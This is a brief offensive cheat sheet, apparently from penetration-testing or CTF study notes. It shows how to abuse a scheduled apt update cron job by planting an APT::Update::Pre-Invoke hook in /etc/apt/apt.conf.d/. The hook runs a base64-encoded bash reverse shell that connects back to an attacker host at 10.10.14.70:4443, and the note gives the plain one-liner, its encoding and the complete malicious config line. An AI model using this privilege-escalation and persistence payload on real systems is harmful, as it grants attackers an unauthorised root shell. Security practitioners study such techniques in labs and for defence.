Pre-invoke files in cron are scripts or commands executed before a scheduled cron job runs. These files serve as preparatory steps, allowing administrators to set up the environment or perform necessary actions before the main cron job execution. 

# APT update pre-invoke

![[Pasted image 20240401163639.png]]

In this example we fund an apt update cron executed each 5 minutes
We can create a pre-invoke for this cron to be excuted before.
https://www.cyberciti.biz/faq/debian-ubuntu-linux-hook-a-script-command-to-apt-get-upgrade-command/

### Creating the payload

The file must be loaded as 
`sudo vi /etc/apt/apt.conf.d/`

As good practice, it's better to use base64
`echo "bash -i >& /dev/tcp/10.10.14.70/4443 0>&1" | base64`

>YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43MC80NDQzIDA+JjEK

#### Payload:
Creating a *malicious* file
   `APT::Update::Pre-Invoke  {"echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43MC80NDQzIDA+JjEK | base64 -d | bash";};`
After charge the payload and listen in attacker machine by the port defined